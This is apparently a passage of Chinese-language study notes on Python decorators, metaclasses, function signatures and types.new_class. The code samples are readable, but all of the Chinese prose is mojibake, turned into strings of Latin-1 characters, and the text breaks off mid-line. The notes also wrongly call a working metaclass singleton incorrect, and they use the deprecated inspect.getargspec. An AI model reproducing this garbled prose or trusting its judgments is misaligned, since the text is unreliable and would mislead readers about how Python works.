ç›´æ¥è®¿é—®æœªåŒ…è£…çš„åŸå§‹å‡½æ•°åœ¨è°ƒè¯•ã€å†…çœå’Œå…¶ä»–å‡½æ•°æ“ä½œæ—¶æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ä½†æ˜¯æˆ‘ ä»¬è¿™é‡Œçš„æ–¹æ¡ˆä»…ä»…é€‚ç”¨äºåœ¨åŒ…è£…å™¨ä¸­æ­£ç¡®ä½¿ç”¨äº† @wraps æˆ–è€…ç›´æ¥è®¾ç½®äº† __wrapped__ å±æ€§çš„æƒ…å†µã€‚ å¦‚æœæœ‰å¤šä¸ªåŒ…è£…å™¨ï¼Œé‚£ä¹ˆè®¿é—® __wrapped__ å±æ€§çš„è¡Œä¸ºæ˜¯ä¸å¯é¢„çŸ¥çš„ï¼Œåº”è¯¥é¿å… è¿™æ ·åš åœ¨ Python3.3 ä¸­åï¼Œå®ƒä¼šç•¥è¿‡æ‰€æœ‰çš„åŒ…è£…å±‚. æœ€åè¦è¯´çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„è£…é¥°å™¨éƒ½ä½¿ç”¨äº† @wraps ï¼Œå› æ­¤è¿™é‡Œçš„æ–¹æ¡ˆå¹¶ä¸å…¨éƒ¨ é€‚ç”¨ã€‚ç‰¹åˆ«çš„ï¼Œå†…ç½®çš„è£…é¥°å™¨ @staticmethod å’Œ @classmethod å°±æ²¡æœ‰éµå¾ªè¿™ä¸ªçº¦å®š (å®ƒä»¬æŠŠåŸå§‹å‡½æ•°å­˜å‚¨åœ¨å±æ€§ __func__ ä¸­)ã€‚ å®šä¹‰ä¸€ä¸ªå¸¦å‚æ•°çš„è£…é¥°å™¨ å¯è‡ªå®šä¹‰å±æ€§çš„è£…é¥°å™¨ ä½ æƒ³å†™ä¸€ä¸ªè£…é¥°å™¨æ¥åŒ…è£…ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å…è®¸ç”¨æˆ·æä¾›å‚æ•°åœ¨è¿è¡Œæ—¶æ§åˆ¶è£…é¥°å™¨ è¡Œä¸ºã€‚ å¼•å…¥ä¸€ä¸ªè®¿é—®å‡½æ•°ï¼Œä½¿ç”¨ nonlocal æ¥ä¿®æ”¹å†…éƒ¨å˜é‡ã€‚ç„¶åè¿™ä¸ªè®¿é—®å‡½æ•°è¢« ä½œä¸ºä¸€ ä¸ªå±æ€§èµ‹å€¼ç»™åŒ…è£…å‡½æ•° å¸¦å¯é€‰å‚æ•°çš„è£…é¥°å™¨ ä¸»è¦æ³¨æ„å¸¦å‚æ•°åŒºåˆ«, è§ diff_warp_with_args åˆ©ç”¨è£…é¥°å™¨å¼ºåˆ¶å‡½æ•°ä¸Šçš„ç±»å‹æ£€æŸ¥ ä½œä¸ºæŸç§ç¼–ç¨‹è§„çº¦ï¼Œä½ æƒ³åœ¨å¯¹å‡½æ•°å‚æ•°è¿›è¡Œå¼ºåˆ¶ç±»å‹æ£€æŸ¥ã€‚ ä½¿ç”¨è£…é¥°å™¨å’Œ inspect.signature å‡½æ•° å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»çš„ä¸€éƒ¨åˆ† ä½ æƒ³åœ¨ç±»ä¸­å®šä¹‰è£…é¥°å™¨ï¼Œå¹¶å°†å…¶ä½œç”¨åœ¨å…¶ä»–å‡½æ•°æˆ–æ–¹æ³•ä¸Šã€‚ åœ¨ç±»é‡Œé¢å®šä¹‰è£…é¥°å™¨å¾ˆç®€å•ï¼Œä½†æ˜¯ä½ é¦–å…ˆè¦ç¡®è®¤å®ƒçš„ä½¿ç”¨æ–¹å¼ã€‚æ¯”å¦‚åˆ°åº•æ˜¯ä½œä¸ºä¸€ ä¸ªå®ä¾‹æ–¹æ³•è¿˜æ˜¯ç±»æ–¹æ³• ä¾‹: from functools import wraps class A: # Decorator as an instance method def decorator1(self, func): @wraps(func) def wrapper(*args, **kwargs): print('Decorator 1') return func(*args, **kwargs) return wrapper # Decorator as a class method @classmethod def decorator2(cls, func): @wraps(func) def wrapper(*args, **kwargs): print('Decorator 2') return func(*args, **kwargs) return wrapper ä½¿ç”¨: # As an instance method a = A() @a.decorator1 def spam(): pass # As a class method @A.decorator2 def grok(): pass ä¸€ä¸ªæ˜¯å®ä¾‹è°ƒç”¨ï¼Œä¸€ä¸ªæ˜¯ç±»è°ƒç”¨ åœ¨ç±»ä¸­å®šä¹‰è£…é¥°å™¨åˆçœ‹ä¸Šå»å¥½åƒå¾ˆå¥‡æ€ªï¼Œä½†æ˜¯åœ¨æ ‡å‡†åº“ä¸­æœ‰å¾ˆå¤šè¿™æ ·çš„ä¾‹å­ã€‚ç‰¹åˆ« çš„ï¼Œ@property è£…é¥°å™¨å®é™…ä¸Šæ˜¯ä¸€ä¸ªç±»ï¼Œå®ƒé‡Œé¢å®šä¹‰äº†ä¸‰ä¸ªæ–¹æ³• getter(), setter(), deleter() , æ¯ä¸€ä¸ªæ–¹æ³•éƒ½æ˜¯ä¸€ä¸ªè£…é¥°å™¨ã€‚ ä¸»è¦åŸå› æ˜¯å„ç§ä¸åŒçš„è£…é¥°å™¨æ–¹æ³•ä¼šåœ¨å…³è”çš„ property å® ä¾‹ä¸Šæ“ä½œå®ƒçš„çŠ¶æ€ã€‚å› æ­¤ï¼Œä»»ä½•æ—¶å€™åªè¦ä½ ç¢°åˆ°éœ€è¦åœ¨è£…é¥°å™¨ä¸­è®°å½•æˆ–ç»‘å®šä¿¡æ¯ï¼Œé‚£ä¹ˆ è¿™ä¸å¤±ä¸ºä¸€ç§å¯è¡Œæ–¹æ³• å¯¹äºç±»é‡Œé¢å®šä¹‰çš„åŒ…è£…å™¨è¿˜æœ‰ä¸€ç‚¹æ¯”è¾ƒéš¾ç†è§£ï¼Œå°±æ˜¯åœ¨æ¶‰åŠåˆ°ç»§æ‰¿çš„æ—¶å€™ã€‚ä¾‹å¦‚ï¼Œ å‡è®¾ä½ æƒ³è®©åœ¨ A ä¸­å®šä¹‰çš„è£…é¥°å™¨ä½œç”¨åœ¨å­ç±» B ä¸­ã€‚ä½ éœ€è¦åƒä¸‹é¢è¿™æ ·å†™: class B(A): @A.decorator2 def bar(self): pass ä¹Ÿå°±æ˜¯è¯´ï¼Œè£…é¥°å™¨è¦è¢«å®šä¹‰æˆç±»æ–¹æ³•å¹¶ä¸”ä½ å¿…é¡»æ˜¾å¼çš„ä½¿ç”¨çˆ¶ç±»åå»è°ƒç”¨å®ƒã€‚ä½ ä¸ èƒ½ä½¿ç”¨ @B.decorator2 ï¼Œå› ä¸ºåœ¨æ–¹æ³•å®šä¹‰æ—¶ï¼Œè¿™ä¸ªç±» B è¿˜æ²¡æœ‰è¢«åˆ›å»ºã€‚ å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±» ä½ æƒ³ä½¿ç”¨ä¸€ä¸ªè£…é¥°å™¨å»åŒ…è£…å‡½æ•°ï¼Œä½†æ˜¯å¸Œæœ›è¿”å›ä¸€ä¸ªå¯è°ƒç”¨çš„å®ä¾‹ã€‚ä½ éœ€è¦è®©ä½ çš„ è£…é¥°å™¨å¯ä»¥åŒæ—¶å·¥ä½œåœ¨ç±»å®šä¹‰çš„å†…éƒ¨å’Œå¤–éƒ¨ éœ€è¦å®ç° __call__() å’Œ __get__() æ–¹æ³• , å¦‚: import types from functools import wraps class Profiled: def __init__(self, func): # å°†è‡ªå·±è®¾ä¸ºè£…é¥°çš„å¯¹è±¡ wraps(func)(self) self.ncalls = 0 def __call__(self, *args, **kwargs): self.ncalls += 1 return self.__wrapped__(*args, **kwargs) # æè¿°å™¨æ–¹æ³•, å¿…é¡»å®ç°, ä»¥è¡¥å……æ‰€è£…é¥°ç±»æ–¹æ³•çš„ç¬¬ä¸€ä¸ª self å‚æ•° def __get__(self, instance, cls): if instance is None: return self else: return types.MethodType(self, instance) __get__() æ–¹æ³•æ˜¯ä¸ºäº†ç¡®ä¿ç»‘å®šæ–¹æ³•å¯¹è±¡èƒ½è¢«æ­£ç¡®çš„åˆ›å»ºã€‚type.MethodType() æ‰‹ åŠ¨åˆ›å»ºä¸€ä¸ªç»‘å®šæ–¹æ³•æ¥ä½¿ç”¨ã€‚åªæœ‰å½“å®ä¾‹è¢«ä½¿ç”¨çš„æ—¶å€™ç»‘å®šæ–¹æ³•æ‰ä¼šè¢«åˆ›å»ºã€‚å¦‚æœè¿™ä¸ª æ–¹æ³•æ˜¯åœ¨ç±»ä¸Šé¢æ¥è®¿é—®ï¼Œé‚£ä¹ˆ __get__() ä¸­çš„ instance å‚æ•°ä¼šè¢«è®¾ç½®æˆ None å¹¶ç›´æ¥ è¿”å› Profiled å®ä¾‹æœ¬èº«ã€‚ ä¸ºç±»å’Œé™æ€æ–¹æ³•æä¾›è£…é¥°å™¨ ç»™ç±»æˆ–é™æ€æ–¹æ³•æä¾›è£…é¥°å™¨æ˜¯å¾ˆç®€å•çš„ï¼Œä¸è¿‡è¦ç¡®ä¿è£…é¥°å™¨åœ¨ @classmethod æˆ– @staticmethod ä¹‹åã€‚ä¸ç„¶è¢«è£…é¥°çš„å°±æ˜¯ @classmethod äº†, è€Œå…¶åˆæ²¡æœ‰è¿”å›å¯è°ƒç”¨å¯¹è±¡. è£…é¥°å™¨ä¸ºè¢«åŒ…è£…å‡½æ•°å¢åŠ å‚æ•° å¯ä»¥ä½¿ç”¨å…³é”®å­—å‚æ•°æ¥ç»™è¢«åŒ…è£…å‡½æ•°å¢åŠ é¢å¤–å‚æ•°: from functools import wraps def optional_debug(func): @wraps(func) def wrapper(*args, debug=False, **kwargs): if debug: print('Calling', func.__name__) return func(*args, **kwargs) return wrapper è°ƒç”¨: >>> @optional_debug ... def spam(a,b,c): ... print(a,b,c) ... >>> spam(1,2,3) 1 2 3 >>> spam(1,2,3, debug=True) Calling spam 1 2 3 >>> é€šè¿‡è£…é¥°å™¨æ¥ç»™è¢«åŒ…è£…å‡½æ•°å¢åŠ å‚æ•°çš„åšæ³•å¹¶ä¸å¸¸è§ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæœ‰æ—¶å€™å®ƒå¯ä»¥é¿ å…ä¸€äº›é‡å¤ä»£ç ã€‚ è¿™ç§å®ç°æ–¹æ¡ˆä¹‹æ‰€ä»¥è¡Œå¾—é€šï¼Œåœ¨äºå¼ºåˆ¶å…³é”®å­—å‚æ•°å¾ˆå®¹æ˜“è¢«æ·»åŠ åˆ°æ¥å—*args å’Œ**kwargs å‚æ•°çš„å‡½æ•°ä¸­ã€‚ ä¸è¿‡å¯èƒ½ä¼šä¸å‡½æ•°æœ¬æ¥çš„å‚æ•°å†²çª, æ•…å¯ä»¥åœ¨è£…é¥°å™¨åŠ å…¥å‚æ•°åˆ¤æ–­: if 'debug' in inspect.getargspec(func).args: raise TypeError('debug argument already defined') å¦‚æœè¦æ”¯æŒä½¿ç”¨inspectæ£€æŸ¥åŸæœ‰å‚æ•°æ—¶, æ˜¾ç¤ºè¿™ä¸ªå…³é”®å­—å‚æ•°, è£…é¥°å™¨å‡½æ•°å¢åŠ : @wraps(func) def wrapper(*args, debug=False, **kwargs): ... sig = inspect.signature(func) parms = list(sig.parameters.values()) parms.append(inspect.Parameter('debug', inspect.Parameter.KEYWORD_ONLY, default=False)) wrapper.__signature__ = sig.replace(parameters=parms) return wrapper ä½¿ç”¨è£…é¥°å™¨æ‰©å……ç±»çš„åŠŸèƒ½ ä½ æƒ³é€šè¿‡åçœæˆ–è€…é‡å†™ç±»å®šä¹‰çš„æŸéƒ¨åˆ†æ¥ä¿®æ”¹å®ƒçš„è¡Œä¸ºï¼Œä½†æ˜¯ä½ åˆä¸å¸Œæœ›ä½¿ç”¨ç»§ æ‰¿æˆ–å…ƒç±»çš„æ–¹å¼ è¿™ç§æƒ…å†µå¯èƒ½æ˜¯ç±»è£…é¥°å™¨æœ€å¥½çš„ä½¿ç”¨åœºæ™¯äº†ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªé‡å†™äº†ç‰¹æ®Šæ–¹æ³•__getattribute__çš„ç±»è£…é¥°å™¨ï¼Œå¯ä»¥æ‰“å°æ—¥å¿—: def log_getattribute(cls): # Get the original implementation orig_getattribute = cls.__getattribute__ # Make a new definition def new_getattribute(self, name): print('getting:', name) return orig_getattribute(self, name) # Attach to the class and return cls.__getattribute__ = new_getattribute return cls å¦‚æœä½ ç³»æƒ³åœ¨ä¸€ä¸ªç±»ä¸Šé¢ä½¿ç”¨å¤šä¸ªç±»è£…é¥°å™¨ï¼Œé‚£ä¹ˆå°±éœ€è¦æ³¨æ„ä¸‹é¡ºåºé—®é¢˜ã€‚ä¾‹å¦‚ï¼Œ ä¸€ä¸ªè£…é¥°å™¨ A ä¼šå°†å…¶è£…é¥°çš„æ–¹æ³•å®Œæ•´æ›¿æ¢æˆå¦ä¸€ç§å®ç°ï¼Œè€Œå¦ä¸€ä¸ªè£…é¥°å™¨ B åªæ˜¯ç®€å• çš„åœ¨å…¶è£…é¥°çš„æ–¹æ³•ä¸­æ·»åŠ ç‚¹é¢å¤–é€»è¾‘ã€‚é‚£ä¹ˆè¿™æ—¶å€™è£…é¥°å™¨ A å°±éœ€è¦æ”¾åœ¨è£…é¥°å™¨ B çš„å‰ é¢ ä½¿ç”¨å…ƒç±»æ§åˆ¶å®ä¾‹çš„åˆ›å»º ä¸å…è®¸å®ä¾‹: class NoInstances(type): def __call__(self, *args, **kwargs): raise TypeError(\"Can't instantiate directly\") # Example class Spam(metaclass=NoInstances): @staticmethod def grok(x): print('Spam.grok') å®ç°å•ä¾‹æ¨¡å¼: class Singleton(type): def __init__(self, *args, **kwargs): self.__instance = None super().__init__(*args, **kwargs) def __call__(self, *args, **kwargs): if self.__instance is None: self.__instance = super().__call__(*args, **kwargs) return self.__instance else: return self.__instance ä¸Šè¿°å®ç°å•ä¾‹æ˜¯é”™è¯¯çš„, å¯èƒ½æ˜¯å¤è€çš„Pythonç‰ˆæœ¬æ”¯æŒè¿™æ ·ä½¿ç”¨. è¿˜æ˜¯è€è€å®å®çš„: class Single(object): __instance: 'Single' = None def __new__(cls, *args, **kwargs): if cls.__instance is None: cls.__instance = super().__new__(cls) return cls.__instance æ•è·ç±»çš„å±æ€§å®šä¹‰é¡ºåº æƒ³è‡ªåŠ¨è®°å½•ä¸€ä¸ªç±»ä¸­å±æ€§å’Œæ–¹æ³•å®šä¹‰çš„é¡ºåºï¼Œç„¶åå¯ä»¥åˆ©ç”¨å®ƒæ¥åšå¾ˆå¤šæ“ä½œï¼ˆæ¯” å¦‚åºåˆ—åŒ–ã€æ˜ å°„åˆ°æ•°æ®åº“ç­‰ç­‰ï¼‰ã€‚ åˆ©ç”¨å…ƒç±»å¯ä»¥å¾ˆå®¹æ˜“çš„æ•è·ç±»çš„å®šä¹‰ä¿¡æ¯ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œä½¿ç”¨äº†ä¸€ä¸ª OrderedDict æ¥è®°å½•æè¿°å™¨çš„å®šä¹‰é¡ºåº è¿™é‡Œæˆ‘æ²¡æœ‰çœ‹æ‡‚, å†™çš„å•¥ç©æ„å„¿, è·³è¿‡. å®šä¹‰æœ‰å¯é€‰å‚æ•°çš„å…ƒç±» ä½ æƒ³å®šä¹‰ä¸€ä¸ªå…ƒç±»ï¼Œå…è®¸ç±»å®šä¹‰æ—¶æä¾›å¯é€‰å‚æ•°ï¼Œè¿™æ ·å¯ä»¥æ§åˆ¶æˆ–é…ç½®ç±»å‹çš„åˆ›å»º è¿‡ç¨‹ã€‚ åœ¨è‡ªå®šä¹‰å…ƒç±»ä¸­æˆ‘ä»¬å¯ä»¥æä¾›å…³é”®å­—å‚æ•°: class Spam(metaclass=MyMeta, debug=True, synchronize=True): pass ä¸ºäº†ä½¿å…ƒç±»æ”¯æŒè¿™äº›å…³é”®å­—å‚æ•°, ä½ å¿…é¡»ç¡®ä¿åœ¨__prepare__(),__new__()å’Œ__init__()æ–¹æ³• ä¸­éƒ½ä½¿ç”¨å¼ºåˆ¶å…³é”®å­—å‚æ•°ã€‚å°±åƒä¸‹é¢è¿™æ ·: class MyMeta(type): # Optional @classmethod def __prepare__(cls, name, bases, *, debug=False, synchronize=False): # Custom processing pass return super().__prepare__(name, bases) # Required def __new__(cls, name, bases, ns, *, debug=False, synchronize=False): # Custom processing pass return super().__new__(cls, name, bases, ns) # Required def __init__(self, name, bases, ns, *, debug=False, synchronize=False): # Custom processing pass super().__init__(name, bases, ns) ç»™ä¸€ä¸ªå…ƒç±»æ·»åŠ å¯é€‰å…³é”®å­—å‚æ•°éœ€è¦ä½ å®Œå…¨å¼„æ‡‚ç±»åˆ›å»ºçš„æ‰€æœ‰æ­¥éª¤ï¼Œå› ä¸ºè¿™äº›å‚ æ•°ä¼šè¢«ä¼ é€’ç»™æ¯ä¸€ä¸ªç›¸å…³çš„æ–¹æ³•ã€‚__prepare__() æ–¹æ³•åœ¨æ‰€æœ‰ç±»å®šä¹‰å¼€å§‹æ‰§è¡Œå‰é¦–å…ˆ è¢«è°ƒç”¨ï¼Œç”¨æ¥åˆ›å»ºç±»å‘½åç©ºé—´ã€‚é€šå¸¸æ¥è®²ï¼Œè¿™ä¸ªæ–¹æ³•åªæ˜¯ç®€å•çš„è¿”å›ä¸€ä¸ªå­—å…¸æˆ–å…¶ä»–æ˜  å°„å¯¹è±¡ã€‚__new__() æ–¹æ³•è¢«ç”¨æ¥å®ä¾‹åŒ–æœ€ç»ˆçš„ç±»å¯¹è±¡ã€‚å®ƒåœ¨ç±»çš„ä¸»ä½“è¢«æ‰§è¡Œå®Œåå¼€å§‹æ‰§ è¡Œã€‚__init__() æ–¹æ³•æœ€åè¢«è°ƒç”¨ï¼Œç”¨æ¥æ‰§è¡Œå…¶ä»–çš„ä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚ å½“æˆ‘ä»¬æ„é€ å…ƒç±»çš„æ—¶å€™ï¼Œé€šå¸¸åªéœ€è¦å®šä¹‰ä¸€ä¸ª __new__() æˆ– __init__() æ–¹æ³•ï¼Œä½† ä¸æ˜¯ä¸¤ä¸ªéƒ½å®šä¹‰ã€‚ä½†æ˜¯ï¼Œå¦‚æœéœ€è¦æ¥å—å…¶ä»–çš„å…³é”®å­—å‚æ•°çš„è¯ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•å°±è¦åŒæ—¶æ ä¾›ï¼Œå¹¶ä¸”éƒ½è¦æä¾›å¯¹åº”çš„å‚æ•°ç­¾åã€‚é»˜è®¤çš„ __prepare__() æ–¹æ³•æ¥å—ä»»æ„çš„å…³é”®å­—å‚ æ•°ï¼Œä½†æ˜¯ä¼šå¿½ç•¥å®ƒä»¬ï¼Œæ‰€ä»¥åªæœ‰å½“è¿™äº›é¢å¤–çš„å‚æ•°å¯èƒ½ä¼šå½±å“åˆ°ç±»å‘½åç©ºé—´çš„åˆ›å»ºæ—¶ä½  æ‰éœ€è¦å»å®šä¹‰ __prepare__() æ–¹æ³•ã€‚ é€šè¿‡ä½¿ç”¨å¼ºåˆ¶å…³é”®å­—å‚æ•°ï¼Œåœ¨ç±»çš„åˆ›å»ºè¿‡ç¨‹ä¸­æˆ‘ä»¬å¿…é¡»é€šè¿‡å…³é”®å­—æ¥æŒ‡å®šè¿™äº›å‚ æ•°ã€‚ ä½¿ç”¨å…³é”®å­—å‚æ•°é…ç½®ä¸€ä¸ªå…ƒç±»è¿˜å¯ä»¥è§†ä½œå¯¹ç±»å˜é‡çš„ä¸€ç§æ›¿ä»£æ–¹å¼ã€‚ä¾‹å¦‚: class Spam(metaclass=MyMeta): debug = True synchronize = True å°†è¿™äº›å±æ€§å®šä¹‰ä¸ºå‚æ•°çš„å¥½å¤„åœ¨äºå®ƒä»¬ä¸ä¼šæ±¡æŸ“ç±»çš„åç§°ç©ºé—´ï¼Œè¿™äº›å±æ€§ä»…ä»…åª ä»å±äºç±»çš„åˆ›å»ºé˜¶æ®µï¼Œè€Œä¸æ˜¯ç±»ä¸­çš„è¯­å¥æ‰§è¡Œé˜¶æ®µã€‚å¦å¤–ï¼Œå®ƒä»¬åœ¨ __prepare__() æ–¹ æ³•ä¸­æ˜¯å¯ä»¥è¢«è®¿é—®çš„ï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•ä¼šåœ¨æ‰€æœ‰ç±»ä¸»ä½“æ‰§è¡Œå‰è¢«æ‰§è¡Œã€‚ä½†æ˜¯ç±»å˜é‡åªèƒ½åœ¨ å…ƒç±»çš„ __new__() å’Œ __init__() æ–¹æ³•ä¸­å¯è§ã€‚ *argså’Œ**kwargsçš„å¼ºåˆ¶å‚æ•°ç­¾å ä½ æœ‰ä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•ï¼Œå®ƒä½¿ç”¨*args å’Œ**kwargs ä½œä¸ºå‚æ•°ï¼Œè¿™æ ·ä½¿å¾—å®ƒæ¯”è¾ƒé€šç”¨ï¼Œ ä½†æœ‰æ—¶å€™ä½ æƒ³æ£€æŸ¥ä¼ é€’è¿›æ¥çš„å‚æ•°æ˜¯ä¸æ˜¯æŸä¸ªä½ æƒ³è¦çš„ç±»å‹ã€‚ å¯¹ä»»ä½•æ¶‰åŠåˆ°æ“ä½œå‡½æ•°è°ƒç”¨ç­¾åçš„é—®é¢˜ï¼Œä½ éƒ½åº”è¯¥ä½¿ç”¨ inspect æ¨¡å—ä¸­çš„ç­¾åç‰¹ æ€§ã€‚æˆ‘ä»¬æœ€ä¸»è¦å…³æ³¨ä¸¤ä¸ªç±»ï¼šSignature å’Œ Parameter ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ›å»ºå‡½æ•°å‰é¢çš„äº¤ äº’ä¾‹å­: >>> from inspect import Signature, Parameter >>> # Make a signature for a func(x, y=42, *, z=None) >>> parms = [ Parameter('x', Parameter.POSITIONAL_OR_KEYWORD), ... Parameter('y', Parameter.POSITIONAL_OR_KEYWORD, default=42), ... Parameter('z', Parameter.KEYWORD_ONLY, default=None) ] >>> sig = Signature(parms) >>> print(sig) (x, y=42, *, z=None) >>> ä¸€æ—¦ä½ æœ‰äº†ä¸€ä¸ªç­¾åå¯¹è±¡ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨å®ƒçš„ bind() æ–¹æ³•å¾ˆå®¹æ˜“çš„å°†å®ƒç»‘å®š åˆ°*args å’Œ**kwargs ä¸Šå»: >>> def func(*args, **kwargs): ... bound_values = sig.bind(*args, **kwargs) ... for name, value in bound_values.arguments.items(): ... print(name,value) ... >>> # Try various examples >>> func(1, 2, z=3) x 1 y 2 z 3 >>> func(1) x 1 >>> func(1, z=3) x 1 z 3 >>> func(y=2, x=1) x 1 åœ¨æˆ‘ä»¬éœ€è¦æ„å»ºé€šç”¨å‡½æ•°åº“ã€ç¼–å†™è£…é¥°å™¨æˆ–å®ç°ä»£ç†çš„æ—¶å€™ï¼Œå¯¹äº*args å’Œ**kwargs çš„ä½¿ç”¨æ˜¯å¾ˆæ™®éçš„ã€‚ä½†æ˜¯ï¼Œè¿™æ ·çš„å‡½æ•°æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯å½“ä½ æƒ³è¦å®ç°è‡ªå·±çš„ å‚æ•°æ£€éªŒæ—¶ï¼Œä»£ç å°±ä¼šç¬¨æ‹™æ··ä¹±ã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ é€šè¿‡ä¸€ä¸ªç­¾åå¯¹è±¡æ¥ç®€åŒ–å®ƒã€‚ ä½¿ç”¨ç±»å®ç°: from inspect import Signature, Parameter def make_sig(*names): parms = [Parameter(name, Parameter.POSITIONAL_OR_KEYWORD) for name in names] return Signature(parms) class StructureMeta(type): def __new__(cls, clsname, bases, clsdict): clsdict['__signature__'] = make_sig(*clsdict.get('_fields',[])) return super().__new__(cls, clsname, bases, clsdict) class Structure(metaclass=StructureMeta): _fields = [] def __init__(self, *args, **kwargs): bound_values = self.__signature__.bind(*args, **kwargs) for name, value in bound_values.arguments.items(): setattr(self, name, value) # Example class Stock(Structure): _fields = ['name', 'shares', 'price'] class Point(Structure): _fields = ['x', 'y'] å½“æˆ‘ä»¬è‡ªå®šä¹‰ç­¾åçš„æ—¶å€™ï¼Œå°†ç­¾åå­˜å‚¨åœ¨ç‰¹å®šçš„å±æ€§ __signature__ ä¸­é€šå¸¸æ˜¯å¾ˆ æœ‰ç”¨çš„ã€‚è¿™æ ·çš„è¯ï¼Œåœ¨ä½¿ç”¨ inspect æ¨¡å—æ‰§è¡Œå†…çœçš„ä»£ç å°±èƒ½å‘ç°ç­¾åå¹¶å°†å®ƒä½œä¸ºè°ƒ ç”¨çº¦å®š: >>> import inspect >>> print(inspect.signature(Stock)) (name, shares, price) >>> print(inspect.signature(Point)) (x, y) >>> åœ¨ç±»ä¸Šå¼ºåˆ¶ä½¿ç”¨ç¼–ç¨‹è§„çº¦ ä½ çš„ç¨‹åºåŒ…å«ä¸€ä¸ªå¾ˆå¤§çš„ç±»ç»§æ‰¿ä½“ç³»ï¼Œä½ å¸Œæœ›å¼ºåˆ¶æ‰§è¡ŒæŸäº›ç¼–ç¨‹è§„çº¦ï¼ˆæˆ–è€…ä»£ç  è¯Šæ–­ï¼‰æ¥å¸®åŠ©ç¨‹åºå‘˜ä¿æŒæ¸…é†’ã€‚ åœ¨å…ƒç±»ä¸­é€‰æ‹©é‡æ–°å®šä¹‰ __new__() æ–¹æ³•è¿˜æ˜¯ __init__() æ–¹æ³•å–å†³äºä½ æƒ³æ€æ ·ä½¿ ç”¨ç»“æœç±»ã€‚__new__() æ–¹æ³•åœ¨ç±»åˆ›å»ºä¹‹å‰è¢«è°ƒç”¨ï¼Œé€šå¸¸ç”¨äºé€šè¿‡æŸç§æ–¹å¼ï¼ˆæ¯”å¦‚é€šè¿‡æ”¹ å˜ç±»å­—å…¸çš„å†…å®¹ï¼‰ä¿®æ”¹ç±»çš„å®šä¹‰ã€‚è€Œ __init__() æ–¹æ³•æ˜¯åœ¨ç±»è¢«åˆ›å»ºä¹‹åè¢«è°ƒç”¨ï¼Œå½“ä½  éœ€è¦å®Œæ•´æ„å»ºç±»å¯¹è±¡çš„æ—¶å€™ä¼šå¾ˆæœ‰ç”¨ã€‚ å…¶å®å°±æ˜¯ä½¿ç”¨é¡¶çº§çˆ¶ç±», å› ä¸ºæ–°æ—§ç‰ˆæœ¬ä¸ä¸€è‡´å°±ä¸èµ°ä¹¦ä¸Šçš„ä¾‹å­äº† ä»¥ç¼–ç¨‹æ–¹å¼å®šä¹‰ç±» é—®é¢˜ ä½ åœ¨å†™ä¸€æ®µä»£ç ï¼Œæœ€ç»ˆéœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ã€‚ä½ è€ƒè™‘å°†ç±»çš„å®šä¹‰æºä»£ç ä»¥å­—ç¬¦ ä¸²çš„å½¢å¼å‘å¸ƒå‡ºå»ã€‚å¹¶ä¸”ä½¿ç”¨å‡½æ•°æ¯”å¦‚ exec() æ¥æ‰§è¡Œå®ƒï¼Œä½†æ˜¯ä½ æƒ³å¯»æ‰¾ä¸€ä¸ªæ›´åŠ ä¼˜é›… çš„è§£å†³æ–¹æ¡ˆã€‚ è§£å†³æ–¹æ¡ˆ ä½ å¯ä»¥ä½¿ç”¨å‡½æ•° types.new_class() æ¥åˆå§‹åŒ–æ–°çš„ç±»å¯¹è±¡ã€‚ä½ éœ€è¦åšçš„åªæ˜¯æä¾› ç±»çš„åå­—ã€çˆ¶ç±»å…ƒç»„ã€å…³é”®å­—å‚æ•°ï¼Œä»¥åŠä¸€ä¸ªç”¨æˆå‘˜å˜é‡å¡«å……ç±»å­—å…¸çš„å›è°ƒå‡½æ•°ã€‚ å¦‚: # stock.py # Example of making a class manually from parts # Methods def __init__(self, name, shares, price): self.name = name self.shares = shares self.price = price def cost(self): return self.shares * self.price cls_dict = { '__init__' : __init__, 'cost' : cost, } # Make a class import types Stock = types.new_class('Stock', (), {}, lambda ns: ns.update(cls_dict)) Stock.__module__ = __name__ è¿™ç§æ–¹å¼ä¼šæ„å»ºä¸€ä¸ªæ™®é€šçš„ç±»å¯¹è±¡ï¼Œå¹¶ä¸”æŒ‰ç…§ä½ çš„æœŸæœ›å·¥ä½œ: >>> s = Stock('ACME', 50, 91.1) >>> s <stock.Stock object at 0x1006a9b10> >>> s.cost() 4555.0 >>> Stock.__module__ = __name__ ç”¨äºç”Ÿæˆ __repr__() æ–¹æ³•çš„è¾“å‡ºã€‚å®ƒåŒæ ·ä¹Ÿè¢«ç”¨äºå¾ˆå¤šåº“ï¼Œæ¯”å¦‚ pickle ã€‚å› æ­¤ï¼Œä¸ºäº†è®©ä½ åˆ›å»ºçš„ç±»æ˜¯\"æ­£ç¡®\"çš„ï¼Œä½ éœ€è¦ç¡®ä¿è¿™ä¸ªå±æ€§ä¹Ÿè®¾ç½®æ­£ç¡®äº†ã€‚ å¦‚æœä½ æƒ³åˆ›å»ºçš„ç±»éœ€è¦ä¸€ä¸ªä¸åŒçš„å…ƒç±»ï¼Œå¯ä»¥é€šè¿‡ types.new_class() ç¬¬ä¸‰ä¸ªå‚ æ•°ä¼ é€’ç»™å®ƒ: Stock = types.new_class('Stock', (), {'metaclass': abc.ABCMeta}, lambda ns: ns.update(cls_dict)) ç¬¬ä¸‰ä¸ªå‚æ•°è¿˜å¯ä»¥åŒ…å«å…¶ä»–çš„å…³é”®å­—å‚æ•°. æ¯”å¦‚ï¼Œä¸€ä¸ªç±»çš„å®šä¹‰å¦‚ä¸‹: class Spam(Base, debug=True, typecheck=False): pass å¯ä»¥è¿™æ ·å®šä¹‰: Spam = types.new_class('Spam', (Base,), {'debug': True, 'typecheck': False}, lambda ns: 